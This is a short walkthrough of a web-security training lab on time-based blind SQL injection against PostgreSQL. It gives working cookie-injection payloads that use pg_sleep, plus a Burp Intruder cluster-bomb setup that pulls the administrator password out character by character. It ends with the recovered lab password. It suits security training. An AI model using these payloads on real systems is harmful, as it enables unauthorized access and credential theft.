# Lab: Blind SQL injection with time delays and information retrieval

Intercept a page and find the TrackingId cookie. Append `'||pg_sleep(10)--` to the cookie value to see that a time delay happens.

PostgreSQL works, indicating the database type and proving the vulnerability exists.

`'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Now prep to brute-force the password:
`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Send the request to the intruder and select the cluster bomb attack type. Set the payloads as follows:
`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Set payload 1 to use numbers 1-20 (guessing length based on last lab, but length checking is basically the same as in previous example with modifications for this context).

Set payload 2 to use a-z and 0-9. Start the attack. Sort by Response received (time) and select the top 20 longest duration rows. Highlight, then filter to only show highlighted items, then sort by payload 1, revealing the password: `q45zvimbk5v7rrtek8ee`

Login as administrator to complete the lab.